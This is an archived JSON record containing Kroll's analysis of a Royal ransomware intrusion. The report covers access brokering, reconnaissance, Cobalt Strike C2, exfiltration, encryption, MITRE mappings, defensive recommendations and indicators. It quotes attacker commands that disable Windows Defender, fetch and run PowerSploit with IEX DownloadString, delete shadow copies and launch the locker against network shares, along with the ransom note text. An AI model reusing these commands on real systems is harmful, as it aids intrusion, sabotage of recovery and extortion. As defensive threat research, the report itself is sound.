{
    "id": "1d81b37d-db5b-452d-aad6-e48134e5b08a",
    "created_at": "2023-05-06T02:08:44.396075Z",
    "updated_at": "2025-03-27T02:09:29.217407Z",
    "deleted_at": null,
    "sha1_hash": "e3a4cb07a081131cb25a1ff7ea747f33031c2222",
    "title": "2023-02-13 - Royal Ransomware Deep Dive",
    "authors": "",
    "file_creation_date": "2023-05-05T02:00:56Z",
    "file_modification_date": "2023-05-05T02:00:56Z",
    "file_size": 2355893,
    "plain_text": "# Royal Ransomware Deep Dive\n\n**[kroll.com/en/insights/publications/cyber/royal-ransomware-deep-dive](https://www.kroll.com/en/insights/publications/cyber/royal-ransomware-deep-dive)**\n\n[The threat actor group behind Royal ransomware first appeared in January 2022, pulling](https://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/)\ntogether actors previously associated with Roy/Zeon, Conti and TrickBot malware. Originally\nknown as “Zeon” before renaming themselves “Royal” in September 2022, they are not\nconsidered a ransomware-as-a-service (RaaS) operation because their coding/infrastructure\nare private and not made available to outside actors. Since the start of 2023, they have\nescalated their attacks to focus on top tier corporations for larger ransoms. Their ransoms\nreportedly range from $250,000 to over $2 million. Although known for using the double\nextortion method of both encrypting and exfiltrating data, as of this writing the group does not\nhave a data leak site where they publish the names of their victims.\n\n[Until recently, the Royal group was observed primarily targeting systems running Windows](https://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/)\noperating system; however, reports surfaced in February 2023 of a variant able to\n[compromise Linux/virtual machines.](https://www.secureblink.com/cyber-security-news/royal-ransomware-latest-threat-to-encrypt-linux-devices)\n\n\n-----\n\n[To gain initial access into a victim network, the group has seemed to favor call-back phishing](https://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/)\nploys, often impersonating food delivery or software providers needing subscription\nrenewals. After a victim calls the telephone number in the phishing email to dispute/cancel\nthe supposed subscription, the victim is persuaded by the threat actor to install remote\naccess software on their computer, thereby providing the actors with initial access to their\norganization’s network.\n\nOpen and closed-source intelligence has also reported the group exploiting web\nvulnerabilities to compromise networks, indicating a potentially greater level of sophistication\nthan the call-back scheme suggests. Another initial access method associated with the group\nis the [abuse of Google Ads to deliver malware: users browsing the internet click on ads they](https://www.kroll.com/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer)\nbelieve to be legitimate, but ultimately lead to downloads of BatLoader, a multifaceted initial\naccess malware. Other tools utilized by Royal include the post exploitation framework Cobalt\nStrike for [persistent access along with PowerSploit, common remote access tools and](https://twitter.com/VK_Intel/status/1580300511081029632)\nexfiltration tools such as MegaCMD and SharpExfiltrate.\n\n## Kroll Case Study\n\nFigure 1 - Tactics, Techniques and Procedures (TTPs) of Recent Royal Ransomware\nInvestigation\n\n### Initial Exploit\n\n\n-----\n\nIn one incident, Kroll s review of the available evidence suggested that the Royal\nransomware actors likely gained access into the environment by purchasing their way in from\nan unrelated actor; many actors are known to serve as “brokers” for such access. Kroll\ndetermined that a renamed version of the remote access and management software\nNetSupport Manager was installed during a previous incident on the victim’s network. In\nKroll’s experience investigating similar attack patterns, a phishing email most likely delivered\nan .iso file for the software; however, due to the passage of time and normal rollover of logs,\nno remnant of a potential phishing email existed at the time of the investigation. In Kroll’s\nexperience, the time between the initial installation of the remote access tool and when it\nwas ultimately used by Royal ransomware actors indicated that the software was not\ninstalled by the ransomware actors, but rather they purchased the access.\n\nMITRE ATT&CK: T1588: Obtain Capabilities\n\n### Internal Scouting\n\nKroll observed the Royal actors using the network scanning tool Netscan to identify network\nshares and other network information. While Netscan is legitimate open-source software,\nmany threat actors are known to use it for reconnaissance because the tool is lightweight\n[and provides an extensive suite of network scanning capabilities. ADFind was also identified](https://attack.mitre.org/software/S0552/)\nas a method to enumerate domain members and groups. In addition, the threat actors used\nbatch scripts to ping, or identify, other systems on the network, along with common\ncommands such as “net user” and “net localgroup” to gain an understanding of the\nenvironment.\n\nMITRE ATT&CK: T1087: Account Discovery\n\nMITRE ATT&CK: T1016: System Network Configuration Discovery\n\nMITRE ATT&CK: T1135: Network Share Discovery\n\n### Toolkit Deployment\n\nThe Royal threat actors leveraged legitimate remote access tools such as Splashtop, Atera\nAgent and AnyDesk to maintain command and control (C2) within the environment. The use\nof all of these tools is not uncommon, as they provide guaranteed persistence by ensuring a\nnumber of channels are available for re-entry. The actors additionally deployed Cobalt Strike\nto maintain control via an HTTPS malleable C2 configuration, commonly with recently\nregistered domains (Figure 2).\n\n\n-----\n\n```\n HttpPostUri : /jquery 3.3.2.min.js,\n\n\"Malleable_C2_Instructions\": [\n\n  \"Remove 1522 bytes from the end\",\n\n  \"Remove 84 bytes from the beginning\",\n\n  \"Remove 3931 bytes from the beginning\",\n\n  \"Base64 URL-safe decode\",\n\n  \"XOR mask w/ random key\"\n\n ],\n\n```\nFigure 2 - Malleable Cobalt Strike C2 Configuration\n\nMITRE ATT&CK: T1219: Remote Access Software\n\nMITRE ATT&CK: T1001: Data Obfuscation\n\nMITRE ATT&CK: T1573.001: Encrypted Channel: Symmetric Cryptography\n\nTo enable the deployment of the ransomware, Royal actors are known to disable antivirus\nsoftware, such as Microsoft Defender, with PowerShell commands (Figure 3) as well as tools\nsuch as PowerTool64.exe and GMER to remove endpoint detection and response (EDR)\nsoftware. Both GMER and PowerTool64 are designed to remove rootkit type malware, but\ncan also be used maliciously to remove applications at the kernel level. These tools can\nprevent the creation of handles, threads and processes from software such as EDR, which in\nturn can prevent the detection of other malicious tools.\n```\nC:\\Windows\\system32\\windowspowershell\\v1.0\\powershell.exe -Command Set-MpPreference DisableRealtimeMonitoring $true\n\n\n```\nFigure 3 - PowerShell Command to Disable Windows Defender\n\nMITRE ATT&CK: T1562.001: Impair Defenses: Disable or Modify Tools\n\n### Escalation\n\nOur investigators observed the threat actors leveraging the common post exploitation tool\nPowerSploit, in particular via the Find-LocalAdminAccess module, in order to identify\nmachines where the current user has local administrator privileges (Figures 4 and 5).\n```\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEA\nG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOg\nAxADgAMAAxADUALwAnACkAOwAgAEYAaQBuAGQALQBMAG8AYwBhAGwAQQBkAG0AaQBuAEEAYwBjAGUAcwBzAA=\n=\n\n```\nFigure 4 - PowerShell PowerSploit Execution\n```\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:18015/'); FindLocalAdminAccess\n\n```\nFigure 5 - PowerSploit Find-LocalAdminAccess\n\n\n-----\n\nMITRE ATT&CK: T1807.001: Account Discovery: Local Account\n\n### Lateral Movement\n\nRoyal actors leverage the information gained from PowerSploit to navigate around the\nnetwork via Remote Desktop Protocol (RDP) before installing remote access tools and\ndisabling antivirus/EDR as they land on new devices. Cobalt Strike is also used to pass\nexplicit credentials to conduct activities across the network.\n\nMITRE ATT&CK: T1021.001: Remote Services: Remote Desktop Protocol\n\n### Mission Execution\n\nAs Royal actors employ the double extortion strategy, one of their main aims is to identify\nand exfiltrate sensitive information. The group uses a number of tools to extract files to cloud\n[storage stealthily via automations, including SharpExfiltrate and Megacmd.exe.](https://mega.io/cmd)\n\nMITRE ATT&CK: T1537: Transfer Data to Cloud Account\n\nMITRE ATT&CK: T1020: Automated Exfiltration\n\nOnce data is exfiltrated, Royal actors will then execute the ransomware binary. This is\ntypically undertaken by a batch script that lists computers, the unique identification key and\nthe percentage of file encryption to use in values between 1 and 100 (Figure 6).\n```\nstart locker.exe -ep 5 -id -path \\\\ENDPOINT.DOMAIN.COM\\C$\n\nstart locker.exe -ep 5 -id -path \\\\ENDPOINT2.DOMAIN.COM\\C$\n\nstart locker.exe -ep 5 -id -path \\\\ENDPOINT3.DOMAIN.COM\\C$\n\n```\nFigure 6 - Example Batch Script to Launch the Ransomware Binary\n\nMITRE ATT&CK: T1059.003: Command and Scripting Interpreter: Windows Command Shell\n\nMITRE ATT&CK: T1064: Scripting\n\nThe analyzed sample depicted in Figure 7 is a 32-bit Portable Executable written in C++;\nKroll’s malware analysis team was able to determine the exact date and time when this was\ncompiled. When run from the command line, the ransomware accepts three arguments:\n\n-path (the path to be encrypted)\n-id (a 32-character alphanumeric ID unique to the victim, which will also be appended\nto the Tor URL)\n-ep (percentage of the file to be encrypted. It accepts values between 1 and 100, and if\na value is given that is not in the range 1-100, the ransomware will encrypt 50%)\n\n\n-----\n\nFigure 7 - Ransomware Configuration Detailing Command Arguments\n\nAfter parsing the command line arguments, the ransomware deletes the Volume Shadow\nCopies to prevent restoration (Figure 8). It achieves this by creating a new vssadmin.exe\nprocess with the argument \"delete shadows /all /quiet\".\n\n\n-----\n\nFigure 8 - Ransomware Configuration Detailing Volume Shadow Copy Deletion\n\nThe ransomware ensures that the -id parameter is 32 characters long and that the current\npath does not contain certain file extensions (such as .exe, .dll or .bat) or already encrypted\nfiles (with extension .royal). It then proceeds with the encryption routine, which uses\nAdvanced Encryption Standard (AES). It finally writes the ransom note in a file named\n“README.TXT” (Figure 9). The note’s text is contained within the .rdata section of the\nexecutable, along with the RSA public key and other strings used by the program.\n\n\n-----\n\n```\nHello!\n\n     If you are reading this, it means that your system were hit by Royal\nransomware.\n\n     Please contact us via :\n\n     http[:]//royal2xthig3ou5hd7zsliqagy6yygk2cdelaxtni2fyad6dpmpxedid[.]onion/\n\nIn the meantime, let us explain this case.It may seem complicated, but it is not!\n\nMost likely what happened was that you decided to save some money on your security\ninfrastructure.\n\nAlas, as a result your critical data was not only encrypted but also copied from your\nsystems on a secure server.\n\nFrom there it can be published online.Then anyone on the internet from darknet\ncriminals, ACLU journalists, Chinese government(different names for the same thing),\n\nand even your employees will be able to see your internal documentation: personal\ndata, HR reviews, internal lawsuitsand complains, financial reports, accounting,\nintellectual property, and more!\n\n     Fortunately we got you covered!\n\nRoyal offers you a unique deal.For a modest royalty(got it; got it ? ) for our\npentesting services we will not only provide you with an amazing risk mitigation\nservice,\n\ncovering you from reputational, legal, financial, regulatory, and insurance risks,\nbut will also provide you with a security review for your systems.\n\nTo put it simply, your files will be decrypted, your data restored and kept\nconfidential, and your systems will remain secure.\n\n     Try Royal today and enter the new era of data security!\n\n     We are looking to hearing from you soon!\n\n```\nFigure 9 - Ransom Note README.TXT Created by the Ransomware Binary\n\nThe link within the ransom note directs the victim to a simple chat portal for the victim to\nnegotiate the ransom (Figure 10).\n\nMITRE ATT&CK: T1486: Data Encrypted for Impact\n\nMITRE ATT&CK: T1490: Inhibit System Recovery\n\n\n-----\n\nFigure 10 - Royal Negotiation Site on Tor (Source: Bleeping Computer)\n\nIf a ransom is not agreed, the actors claim they will post the victim’s exfiltrated information on\ntheir data leak site. While no data leak site for Royal has been identified as of this writing,\nsimilar threat actor groups often post a summary of the victim, along with a link to\nview/download the collected victim data.\n\n## Mitre ATT&CK Mapping\n\n**Tactic** **Technique** **Procedure**\n\nTA0042 T1588 Obtain capabilities\n\nTA0001 T1078 Valid accounts\n\nTA0002 T1059 Command and scripting interpreter\n\n\n-----\n\nT1064 Scripting\n\nTA0003 T1078 Valid accounts\n\nTA0004 T1078 Valid accounts\n\nTA0005 T1562 Impair defenses: disable or modify tools\n\nTA0007 T1049 System network connections discovery\n\nT1087 Account discovery\n\nT1135 Network share discovery\n\nTA0008 T1021 Remote services\n\nTA0009 T1005 Data from local system\n\n\nTA0011\n\n\nT1219 Remote access software\n\n\nT1573.001 Encrypted channel: symmetric\ncryptography\n\nT1001 Data obfuscation\n\nTA0010 T1567.002 Exfiltration over web service: exfiltration to\ncloud storage\n\nT1020 Automate exfiltration\n\nTA0040 T1490 Inhibit system recovery\n\nT1486 Data encrypted for impact\n\n## Recommendations\n\n\n-----\n\nKroll has identified recommendations relating to this alert:\n\n**Recommendation** **Observation**\n\n\nMonitor PowerShell execution\n\nEnsure PowerShell is logged\nand create detections for\nencoded script execution.\n\nAudit user, administrator and\nservice accounts\n\nEnsure accounts have the\ncorrect access and privileges.\nImplement the principle of\nleast privilege.\n\nImplement multifactor\nauthentication\n\nMultifactor authentication can\nrestrict access to sensitive\nareas and can prevent lateral\nmovement.\n\nReview backup strategies\n\nEnsure multiple backups are\ntaken and at least one backup\nis isolated from the network.\n\nReview remote access tools\n\nWhitelist and limit the use of\nmultiple remote access tools\nwithin the network.\n\n\nThe threat actor utilized Cobalt Strike. Monitoring\nPowerShell execution can identify malicious activity\nassociated with Cobalt Strike.\n\nThe threat actor is often able to install tools on user\nendpoints. Limiting the privileges of users can prevent a\nthreat actor from installing malicious software.\n\nEnabling multifactor authentication can prevent a threat\nactor from moving laterally and accessing sensitive data.\n\nAs a ransomware actor’s main aim is to disrupt business,\nensuring a viable backup and recovery strategy is in place\ncan allow a business to recover quickly.\n\nThreat actors leverage legitimate remote access tools to\nmaintain persistence. Ensure remote access is monitored\nand that only approved remote access tools exist in the\nenvironment.\n\n\n## Indicators of Compromise\n\nThe following files and hashes have been identified for the incident.\n\n**File Name** **MD5 Hash Value**\n\n\n-----\n\nlocker.exe B93FA14627F73DE3274BA15503C916B0\n\nSharpeExfiltrate.exe 2F5D60C2475B723526FBDADEFF55C3C7\n\nMEGACmd.exe 9FB7D7A1F50541917972115B7D8265B4\n\nGmer.exe 60BF4AE8CC40B0E3E28613657ED2EED8\n\nPowerTool64.exe FB8535E2BD80CC8044C52A3ED82D390D\n\nAnydesk.exe 7CF4B655453D28F246C815A953F48936\n\nTeamViewer.exe 4F926252E22AFA85E5DA7F83158DB20F\n\nSupport.exe 5A24676210BD317520FE30D048C9A106\n\nThe following external IP addresses were observed during the incident:\n\n**IP Address** **Comment**\n\n23.106.215[.]16 Cobalt Strike C2\n\n64.44.102[.]176 Cobalt Strike C2\n\n## Stay Ahead with Kroll\n\n### Cyber Risk\n\nIncident response, digital forensics, breach notification, managed detection services,\npenetration testing, cyber assessments and advisory.\n\n### 24x7 Incident Response\n\nEnlist experienced responders to handle the entire security incident lifecycle.\n\n### Computer Forensics\n\n\n-----\n\nKroll s computer forensics experts ensure that no digital evidence is overlooked and assist at\nany stage of an investigation or litigation, regardless of the number or location of data\nsources.\n\n### Cyber Risk Retainer\n\nKroll delivers more than a typical incident response retainer—secure a true cyber risk\nretainer with elite digital forensics and incident response capabilities and maximum flexibility\nfor proactive and notification services.\n\n### Ransomware Preparedness Assessment\n\nKroll’s ransomware preparedness assessment helps your organization avoid ransomware\nattacks by examining 14 crucial security areas and attack vectors.\n\n### Data Recovery and Forensic Analysis\n\nKroll's expertise establishes whether data was compromised and to what extent. We uncover\nactionable information, leaving you better prepared to manage a future incident.\n\n### Business Email Compromise (BEC) Response and Investigation\n\nIn a business email compromise (BEC) attack, fast and decisive response can make a\ntremendous difference in limiting financial, reputational and litigation risk. With decades of\nexperience investigating BEC scams across a variety of platforms and proprietary forensic\ntools, Kroll is your ultimate BEC response partner.\n\n### Incident Remediation and Recovery Services\n\nCyber incident remediation and recovery services are part of Kroll’s Complete Response\ncapabilities, expediting system recovery and minimizing business disruption.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-02-13 - Royal Ransomware Deep Dive.pdf"
    ],
    "report_names": [
        "2023-02-13 - Royal Ransomware Deep Dive.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1683338924,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1683252056,
    "ts_modification_date": 1683252056,
    "files": {
        "pdf": "https://archive.orkl.eu/e3a4cb07a081131cb25a1ff7ea747f33031c2222.pdf",
        "text": "https://archive.orkl.eu/e3a4cb07a081131cb25a1ff7ea747f33031c2222.txt",
        "img": "https://archive.orkl.eu/e3a4cb07a081131cb25a1ff7ea747f33031c2222.jpg"
    }
}